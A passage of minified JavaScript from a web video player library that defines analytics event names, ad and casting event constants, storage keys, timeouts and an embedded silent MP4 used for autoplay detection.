NG_RATE_PERC5_25="er.perc.5.25",x.ENG_RATE_PERC5_30="er.perc.5.30",x.ENG_RATE_PERC5_35="er.perc.5.35",x.ENG_RATE_PERC5_40="er.perc.5.40",x.ENG_RATE_PERC5_45="er.perc.5.45",x.ENG_RATE_PERC5_50="er.perc.5.50",x.ENG_RATE_PERC5_55="er.perc.5.55",x.ENG_RATE_PERC5_60="er.perc.5.60",x.ENG_RATE_PERC5_65="er.perc.5.65",x.ENG_RATE_PERC5_70="er.perc.5.70",x.ENG_RATE_PERC5_75="er.perc.5.75",x.ENG_RATE_PERC5_80="er.perc.5.80",x.ENG_RATE_PERC5_85="er.perc.5.85",x.ENG_RATE_PERC5_90="er.perc.5.90",x.ENG_RATE_PERC5_95="er.perc.5.95",x.ENG_RATE_PERC5_100="er.perc.5.100",x.PLAY="play",x.PAUSE="pause",x.COMPLETE="complete",x.BUFFER_START="buffer.start",x.BUFFER_END="buffer.end",x.VOLUME_CHANGE="volume.change",x.MUTE="mute",x.UNMUTE="unmute",x.FULLSCREEN_ENTER="fullscreen.enter",x.FULLSCREEN_EXIT="fullscreen.exit",x.QUALITY_CHANGE="quality.change",x.AUDIO_CHANGE="audio.change",x.SUBTITLES_CHANGE="subtitles.change",x.PLAYER_SHARE_FACEBOOK="player.share.fb",x.PLAYER_SHARE_TWITTER="player.share.twitter",x.PLAYER_SHARE_LINKEDIN="player.share.linkedin",x.PLAYER_SHARE_MAIL="player.share.mail",x.PLAYER_SHARE_EMBED="player.share.embed",x.MEDIA_ERROR="media.error",x.PLAYER_ERROR="player.error",x.MEDIA_USER_START="media.user.start",x.MEDIA_USER_END="media.user.end",x.PAGE_VIEW="page.view",x.PAGE_EXIT="page.exit",x.PAGE_CLICK="page.click",x.PAGE_AD_CLICK="page.ad.click",x.PAGE_AD_CLOSE="page.ad.close",x.PAGE_CHANGE="page.change",x.PAGE_ERROR="page.error",x.PAGE_USER_START="page.user.start",x.PAGE_USER_END="page.user.end",x.PAGE_LOGIN="page.login",x.PAGE_LOGOUT="page.logout",x.PAGE_REGISTER="page.register",x.PAGE_PASSWORD_RESET="page.password.reset",x.PAGE_NEWSLETTER_ADD="page.newsletter.add",x.PAGE_NEWSLETTER_REMOVE="page.newsletter.remove",x.PAGE_SHARE_FACEBOOK="page.share.fb",x.PAGE_SHARE_TWITTER="page.share.twitter",x.PAGE_SHARE_LINKEDIN="page.share.linkedin",x.PAGE_SHARE_MAIL="page.share.mail",x.PAGE_SHARE_EMBED="page.share.embed",x.PAGE_ADD_POST="page.add.post",x.PAGE_REMOVE_POST="page.remove.post",x.PAGE_EDIT_POST="page.edit.post",x.PAGE_LIKE="page.like",x.PAGE_UNLIKE="page.unlike",z.PAGE_TITLE="pt",z.PAGE_LOCATION="lo",z.PAGE_LANGUAGE="la",z.PAGE_CHARACTERSET="cs",z.PAGE_REFERER="rf",z.PAGE_TAGS="pg",z.SCREEN_RESOLUTION="re",z.SCREEN_VIEWPORT="vp",z.SCREEN_DPI="dp",z.SCREEN_ORIENTATION="so",z.SYSTEM_LANGUAGE="ln",z.SYSTEM_TIME_ZONE_OFFFSET="zo",z.SYSTEM_TIME_ZONE="tz",z.MEDIA_MATERIAL_ID="mi",z.MEDIA_RELATED_ID="ri",z.MEDIA_CURRENT_TIME="ct",z.MEDIA_DURATION="du",z.MEDIA_TITLE="vt",z.MEDIA_VOLUME="vo",z.MEDIA_CURRENT_STATE="ms",z.MEDIA_PROGRESS="pr",z.MEDIA_RESOLUTION="vr",z.MEDIA_BITRATE="br",z.MEDIA_SELECTED_SUBTITLE="ss",z.MEDIA_SELECTED_AUDIO="sa",z.MEDIA_TAGS="tg",z.MEDIA_MIME_TYPE="mt",z.MEDIA_IS_DRM_PROTECTED="dr",z.MEDIA_RELATED_URL="ru",z.MEDIA_ENGAGEMENT_RATE_TIME_OFFSET="eo",z.MEDIA_ENGAGEMENT_RATE_POSITION="ep",z.MEDIA_ENGAGEMENT_RATE_RESOLUTION="er",z.POSITION_IN_COLLECTION="cp",z.PLAYER_VERSION="pv",z.EVENT="ev",z.EXTERNAL_ID="ei",z.LOCAL_COOKIE="lc",z.SESSION_COOKIE="sc",z.CROSSDOMAIN_COOKIE="cc",z.COOKIE_DECLINED="dc",z.USER_SEX="sx",z.USER_AGE="ag",z.ARTIST_TYPE="ay",z.ARTIST_ID="ai",z.ARTIST_RELATED_ID="ar",z.ARTIST_TITLE="at",z.ARTIST_TAGS="ta",z.COLLECTION_TYPE="cy",z.COLLECTION_ID="ci",z.COLLECTION_RELATED_ID="cr",z.COLLECTION_TITLE="ce",z.COLLECTION_TAGS="ce",z.COLLECTION_PARENT_COLLECTION="ca",z.COLLECTION_POSITION_IN_PARENT_COLLECTION="pp",h.browserOpera="Opera",h.browserMSIE="Microsoft Internet Explorer",h.browserEdge="Edge",h.browserEdgeChromium="EdgeChromium",h.browserChrome="Chrome",h.browserSafari="Safari",h.browserFirefox="Firefox",h.castingMinPlaybackRate=.5,F.NAMESPACE="bradmax",F.ATTRIBUTE_PID="data-bradmax-player-pid",F.VIDEO_SRC_FOR_COLLECT_AUTOPLAY="data:video/mp4;base64, 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",F.VIDEO_TAG_FOR_AUTOPLAY_INITIALSED="data-ready-for-autoplay",F.PLAYER_ATTRIBUTE_PARENT_ID="data-bs-parent-id",F.PLAYER_ATTRIBUTE_VARIABLES="data-bs-variables",F.HTML_VIDEO_MAX_ELEMENTS_FOR_LATER_AUTOPLAY=2,F.players=new Jb,F.wrappers=[],F.htmlVideoElementsForLaterAutoplay=[],F.pendingVideoElementsForLaterAutoplay=0,F.listenersWaitinfForVideoElementForAutoplay=[],R.staticClassName="bs.player.core.events.BaseEvent",Q.staticClassName="bs.player.core.events.AdEvent",Q.PAUSE_MOVIE="adPauseMovie",Q.PLAY_MOVIE="adPlayMovie",Q.AD_PLAYER_COMPLETE="adPlayerComplete",Q.AD_TIME_CHANGE="adTimeChange",Q.AD_SKIP_BUTTON_SHOW="adSkipButtonShow",Q.AD_PLAYER_START="adPlayerStart",Q.DISABLE_CONTROLS="adDisableControls",Q.ENABLE_CONTROLS="adEnableControls",Q.AD_BAR_SHOW="adBarShow",Q.AD_BAR_HIDE="adBarHide",Q.AD_HIDE="adAdHide",Q.AD_NEXT="adAdNext",Q.AD_PREV="adAdPrev",Q.AD_SHOW="adAdShow",Q.AD_STARTED="adAdStarted",Q.AD_CLICK="adAdClick",Q.CURTAIN_HIDE="adCurtainHide",Q.CURTAIN_SHOW="adCurtainShow",Q.RESIZE_CONTENT="adResizeContent",Q.PAUSE="adPause",Q.PLAY="adPlay",Q.RESUME="adResume",Q.SHOW="adShow",Q.HIDE="adHide",Q.START="adStart",Q.STATE_CHANGE="adStateChange",Q.STOP="adStop",Q.AD_PLAYING="adPlaying",Q.AD_PAUSED="adPaused",Q.AD_STOPPED="adStopped",Q.AD_DURATION_CHANGE="adDurationChange",Q.AD_CURRENT_TIME_CHANGE="adCurrentTimeChange",Q.AD_GROUP_CURRENT_TIME_CHANGE="adGroupCurrentTimeChange",Q.AD_GROUP_DURATION_CHANGE="adGroupDurationChange",Q.AD_COMPLETE="adComplete",Q.AD_SKIP_CLICK="adSkipClick",Q.AD_MEDIA_ERROR="adMediaError",Q.AD_MEDIA_ERROR_FALLBACK_TRY="adMediaErrorFallbackTry",Q.AD_CONNECTION_ERROR="adConnectionError",Q.AD_SEEKING_START="seekingStart",Q.AD_SEEKING_END="seekingEnd",Q.AD_FEED_UPDATE="feedUpdate",Q.AD_IN_STREAM_PLAYING="adInStreamPlaying",Q.AD_IN_STREAM_END="adInStreamEnd",Q.AD_IN_STREAM_CLIP_PLAYING="adInStreamClipPlaying",Q.AD_IN_STREAM_CLIP_END="adInStreamClipEnd",Q.AD_IN_STREAM_ADS_BREAKS_INFO="adInStreamAdsBreaksInfo",Q.AD_IN_STREAM_PLAYING_SILENT="adInStreamPlayingSilent",Q.AD_IN_STREAM_END_SILENT="adInStreamEndSilent",Q.AD_IN_STREAM_CLIP_PLAYING_SILENT="adInStreamClipPlayingSilent",Q.AD_IN_STREAM_CLIP_END_SILENT="adInStreamClipEndSilent",Q.ADD_TRACK="addTrack",ja.staticClassName="bs.player.core.events.ChromecastEvent",ja.CONNECTED="connected",ja.DISCONNECTED="disconnected",ja.RECIVER_CONFIG="reciver_config",W.staticClassName="bs.player.core.events.ControlEvent",W.PLAY="skinPlay",W.PLAY_PAUSE="skinPlayPause",W.PAUSE="skinPause",W.STOP="skinStop",W.SEEK="skinSeek",W.VOLUME="skinVolume",W.MUTE="skinMute",W.UNMUTE="skinUnmute",W.CONTROLBAR_HIDE="skinControlbarHide",W.CONTROLBAR_HIDDEN="skinControlbarHidden",W.CONTROLBAR_SHOW="skinControlbarShow",W.SELECT_AUDIO="selectAudio",W.SELECT_SUBTITLES="selectSubtitles",W.REQUEST_VIDEO_QUALITY_CHANGE="requestVideoQualityChange",W.VIDEO_QUALITY_HAS_CHANGED="videoQualityHasChanged",W.GET_SERIES="getSeries",W.GET_EPISODES="getEpisodes",W.GET_LIVE_CHANNELS="getLiveChannels",W.GET_MEDIA="getMedia",W.CLOSE="close",W.FULLSCREEN="fullscreen",W.REMOTE_SUBTITLE_SHOW="remoteSubtitleShow",W.REMOTE_SUBTITLE_HIDE="remoteSubtitleHide",W.REMOTE_AUDIO_SHOW="remoteAudioShow",W.REMOTE_AUDIO_HIDE="remoteAudioHide",W.FULLSCREEN_TOGGLE_REQUEST="fullscreenToggleRequest",W.AIRPLAY_AVAILABLE="airplayAvailable",W.AIRPLAY="airplay",W.CHROMECAST_AVAILABLE="chromecastAvailable",W.CHROMECAST="chromecast",W.PIP_AVAILABLE="pipAvailable",W.PIP_TOGGLE="pipToggle",W.PIP_ENTER="pipEnter",W.PIP_ENTERED="pipEntered",W.PIP_LEAVE="pipLeave",W.PIP_LEAVED="pipLeaved",W.APP_GOING_BACKGROUND="appGoingBackground",W.APP_GOING_FOREGROUND="appGoingForeground",W.SET_VIDEO_PLAYBACK_RATE="setVideoPlaybackRate",W.PLAYER_INFO_SHOW="playerInfoShow",W.PLAYER_INFO_HIDE="playerInfoHide",W.RELOAD_VIDEO_AFTER_NETWORK_PROBLEM="reloadVideoAfterNetworkProblem",aa.staticClassName="bs.player.core.events.DataProviderEvent",aa.MEDIA_PLAYLIST_DATA="mediaPlaylistData",aa.MEDIA_METADATA_DATA="mediaMetadataData",aa.MEDIA_METADATA_DATA_FOR_YOSPACE="mediaMetadataDataForYospace",aa.MEDIA_AFTER_PLAYBACK_START_METADATA="mediaAfterPlaybackStartMetadata",aa.LIVE_CHANNEL_PROGRAM_METADATA_UPDATE="liveChannelProgramMetadataUpdate",aa.AD_METADATA_DATA="adMetadataData",aa.LIVE_CHANNELS_DATA="liveChannelsData",aa.LIVE_CHANNELS_NEXT_PROGRAM_DATA="liveChannelsNextProgramData",aa.SERIE_DATA="serieData",aa.SEASON_EPISODES_DATA="seasonEpisodesData",aa.MOVIE_DATA="movieData",aa.SUBTITLE_DATA="subtitleData",aa.AUDIO_DATA="audioData",aa.VIDEO_QUALITY_DATA="videoQualityData",aa.VIDEO_QUALITY_PLAYBACK_LEVEL_CHANGE="videoQualityPlaybackLevelChange",aa.SCTE_35_TAG="scte35Tag",aa.CODEC_DATA="codecData",ma.staticClassName="bs.player.core.events.DisplayEvent",ma.HIDE_BUFFERSPINNER="hideBufferSpinner",ma.DISABLE_MOUSE="disableMouse",ma.BRAND_IMAGE_LOADED="brandImageLoaded",ma.SETUP_CLICKABLE_LAYER="setupClickableLayer",ma.SHOW_MESSAGE="showMessage",ma.CLOSE_MESSAGE="closeMessage",ma.ANIMATE_SHOW="animateShow",ma.THUMB_LOADED="thumbLoaded",H.staticClassName="bs.player.core.events.EditEvent",H.EDIT_END_SPLASH="editEndSplash",H.EDIT_COLOR_SCHEME="editColorScheme",B.staticClassName="bs.player.core.events.ErrorEvent",B.SETUP_ERROR="setupError",B.MEDIA_ERROR="mediaError",B.MEDIA_PROVIDER_PARSE_ERROR="mediaProviderError",A.WHEEL="wheel",A.OVER="mouseenter",A.OUT="mouseleave",A.CLICK="click",A.DOWN="mousedown",A.UP="mouseup",A.MOVE="mousemove",A.TOUCH_START="touchstart",A.TOUCH_END="touchend",A.TOUCH_MOVE="touchmove",Z.staticClassName="bs.player.core.events.PlayerCommandEvent",Z.SET_DATA="setData",Z.PLAY="play",Z.PAUSE="pause",Z.SEEK="seek",Z.VOLUME="volume",Z.MUTE="mute",Z.UNMUTE="unmute",na.staticClassName="bs.player.core.events.ResizeEvent",na.RESIZE="resize",na.REPAINT="repaint",T.staticClassName="bs.player.core.events.VideoEvent",T.PLAYING="playing",T.PAUSED="paused",T.STOPPED="stopped",T.DURATION_CHANGE="durationChange",T.CURRENT_TIME_CHANGE="currentTimeChange",T.COMPLETE="complete",T.BUFFERING_START="bufferingStart",T.BUFFERING_END="bufferingEnd",T.SEEKING_START="seekingStart",T.SEEKING_END="seekingEnd",T.LOAD_ERROR="loadError",T.MEDIA_ERROR="mediaError",T.MEDIA_ERROR_FALLBACK_TRY="mediaErrorFallbackTry",T.MEDIA_ERROR_USING_FALLBACK_SOURCE="mediaErrorUsingFallbackSource",T.PLAYBACK_PERMAMENT_ERROR="playbackPermamentError",T.ACCESS_DENIED="accessDenied",T.CONNECTION_ERROR="connectionError",T.CONNECTION_ERROR_WAITING_FOR_USER_ACTION="connectionErrorWaitingForUserAction",T.DRM_AUTHENTICATION_COMPLETE="drmAuthenticationComplete",T.DRM_AUTHENTICATION_ERROR="drmAuthenticationError",T.DRM_AUTHENTICATION_NEEDED="drmAuthenticationNeeded",T.DRM_MODULE_CRUSH="drmModuleCrush",T.READY="ready",T.GET_METRICS="getMetrics",T.SET_METRICS="setMetrics",T.VIDEO_MEDIA_ELEMENT_INIT="videoMediaElementInit",T.AD_VIDEO_MEDIA_ELEMENT_INIT="adVideoMediaElementInit",T.VIDEO_CASTING_START="videoCastingStart",T.VIDEO_CASTING_END="videoCastingEnd",T.NETWORK_ACTIVITY="networkActivityUrl",T.PLAYBACK_RATE="playbackRate",T.MALFUNCTION="malfunction",T.ADD_TRACK="addTrack",V.instance=new V,V.listenersMap=new Jb,V.onceListenersMap=new Jb,V.disabledListenersMap=new Jb,ba.instance=new ba,ha.STATE_BUFFERING="buffering",ha.STATE_COMPLETE="complete",ha.STATE_ERROR="error",ha.STATE_INIT="init",ha.STATE_PLAYING="playing",ha.STATE_PAUSED="paused",ha.STATE_SEEKING="seeking",ka.monitors=new Jb,la.DEFAULT="default",la.KEYOS="keyos",la.EZDRM="ezdrm",ac.SUBTITLE_ENTRY_NATIVE_ELEM_REF_KEY="_element",kc.CFG_KEY="bradmaxAnalytics",kc.ENGAGEMENT_RATE_PERC_MODE_DEFAULT_RESOLUTION=1,kc.ERROR_SUPRESS_WINDOW_AFTER_ERROR=3e3,kc.SPECIAL_CONTENT_META_TAGS="imdbId gracenoteId contentType episodeTitle tvShow season saga genre vendor subscriptionCost contentPrice".split(" "),ab.STATE_PAUSED=1,ab.STATE_PLAYING=10,ab.ENGAGEMENT_RATE_DELAY_AFTER_REQUEST=1e3,ab.ENGAGEMENT_RATE_DELAY_AFTER_REQUEST_LIVE=6e4,Fc.WAITING_PAUSE_TIMEOUT=50,dc.LOCAL_STORAGE_KEY="_brplayer_resume",dc.LOCAL_STORAGE_HISTORY_LEN=20,dc.NO_STORAGE_TIME_WINDOW=5,lc.styles=new Jb,lc.colors=new Jb,qc.CHECK_CONTAINER_SIZE_INTERVAL=30,qc.CONTAINER_RESIZE_DEBUNCE_TIMEOUT=100,qc.RESIZE_ON_REPAINT_DELAY=100,Ac.Icon="bs:Icon",Ac.IconButton="bs:IconButton",Ac.Button="bs:Button",Ac.ImageButton="bs:ImageButton",Ac.Label="bs:Label",Ac.ResponsiveLabel="bs:ResponsiveLabel",Ac.Text="bs:Text",Ac.ItemTiles="bs:ItemTiles",Ac.ItemList="bs:ItemList",Ac.ItemListScroll="bs:ItemListScroll",Ac.ItemArray="bs:ItemArray",Ac.ItemHList="bs:ItemHList",Ac.Box="bs:Box",Ac.VBox="bs:VBox",Ac.HBox="bs:HBox",Ac.Spacer="bs:Spacer",Ac.Spinner="bs:Spinner",Ac.Image="bs:Image",Ac.ITEMS_LIST="bs:Button bs:IconButton bs:Text bs:Label bs:ResponsiveLabel bs:Spacer bs:Box bs:VBox bs:HBox bs:ItemTiles bs:ItemList bs:ItemListScroll bs:ItemHList bs:ItemArray bs:Spinner bs:Image bs:Icon bs:ImageButton".split(" "),Xb.isReadyForCascadingUpdates=new Jb,ed.AUTO_HIDE_TIMEOUT_PC=500,ed.AUTO_HIDE_TIMEOUT_MOBILE=2e3,wd.VIDEO_CAST_ENABLED="videoCastEnabled",wd.RESUME_PLAYBACK_TIMEWINDOW=1500,Qd.VIDEO_CAST_ENABLED="videoCastEnabled",Hd.VARIABLES_PIP_BUTTON_VISIBLE="pictureInPictureButtonVisible",xd.DVR_MIN_WIDTH_FOR_SEEKING=60,xd.MOBILE_VIRTUAL_INDICATOR_RADIUS=15,xd.LIVE_STERAM_IN_SYNC_MIN_PROGRESS=.99,Ud.SESSION_STORAGE_KEY_LANG="_brplayer_aud_lang",Id.EPG_DATA_LIVETIME_MS=9e5,Id.EPG_NEXT_PROGRAM_TIMER_SAFETY_WINDOW=1e3,Vd.SESSION_STORAGE_KEY_LANG="_brplayer_sub_lang",fd.QUALITY_LEVEL_AUTO="-1",yd.SESSION_STORAGE_KEY_VOLUME="_brplayer_vol",yd.SESSION_STORAGE_VOLUME_PRECISTION=3,zd.COUNTER_MAX=10,ud.VIDEO_CAST_ENABLED="videoCastEnabled",Bd.STATE_SHOWING_SPLASH="showing",Bd.STATE_HIDDING_SPLASH="hidding",Bd.STATE_SHOWING_FOR_LOADING="showingForLoading",Nd.NOT_REDIRECTING_LINK_TIMEWINDOW=500,Ma.cache=new Jb,Ma.currentIcon=new Jb,Ma.dirtyCheck=new Jb,Ma.svgNS="http://www.w3.org/2000/svg",Ma.xlinkNS="http://www.w3.org/1999/xlink",$b.NEXT_IMAGE_LOAD_DELAY=50,$b.imagesLoaderQueue=[],We.VARIABLES_SETTINGS_KEY="gemius",Xe.VARIABLES_SETTINGS_KEY="googleAnalytics",kd.SUPPORT_RATE_NOT_SUPPORTED=0,kd.SUPPORT_RATE_BEST_RATE=1,kd.PERMAMENT_PLAYBACK_ERROR_SAFETY_WINDOW=6e3,Ce.BOM_CODE=65279,Jc.SENDER_LIB_URL="https://www.gstatic.com/cv/js/sender/v1/cast_sender.js?loadCastFramework=1",Jc.DEFAULT_BRADMAX_SKIN_APP_ID="53001214",Jc.libLoaded=!1,Jc._isAvailable=!1,Nc.STATE_INIT=0,Nc.STATE_SESSION_CONFIGURED=10,Nc.STATE_MEDIA_CONFIGURED=20,Nc.STATE_REMOTE_PLAYER_CONFIGURED=30,Nc.SETUP_MEDIA_MAX_TIME=12e3,Nc.instances=new Jb,gc.LIVE_STREAM_NOW_OFFSET_DEADZONE_RATIO=.025,gc.LIVE_STREAM_ON_ERROR_MAX_RESTARTS=5,gc.LIVE_STREAM_ON_ERROR_RESTART_TIMEOUT=5e3,gc.STABLE_PLAYBACK_THRESHOLD=30,gc.MAX_RESTARTS_ON_DRM_LICENSE_ISSUE=1,gc.LIVE_STREAM_NOW_OFFSET_UPDATE_PERIOD=1,gc.INITIAL_AVG_SEEKING_TIME=6,gc.LIVE_STREAM_FIREFOX_DECODE_LAG_SAFTY_RATIO=1.25,gc.SEEKING_DEBOUNCER_TIMEOUT_DEFAULT=500,gc.SEEKING_DEBOUNCER_TIMEOUT_SMART_TV=1e3,gc.START_TIME_INIT_WAITING=0,gc.START_TIME_INIT_STARETED=1,gc.START_TIME_INIT_FINALIZED=2,gc.VIDEO_DISCONTINUITY_ANOMALY_SAFEWINDOW=3,gc.DRM_LICENSE_CHECK_STATUS_WAITING=0,gc.DRM_LICENSE_CHECK_STATUS_STARETED=1,gc.DRM_LICENSE_CHECK_STATUS_FINALIZED=2,gc.QUALITY_LEVEL_AUTO="-1",gc.QUALITY_LABEL_TYPE_BITRATE="bitrate",gc.QUALITY_LABEL_TYPE_RESOLUTION="resolution",gc.QUALITY_LABEL_TYPE_VARIABLES_KEY="qualityLabelType",gc.DURRATION_MIN_DIFF_FOR_PRE_PLA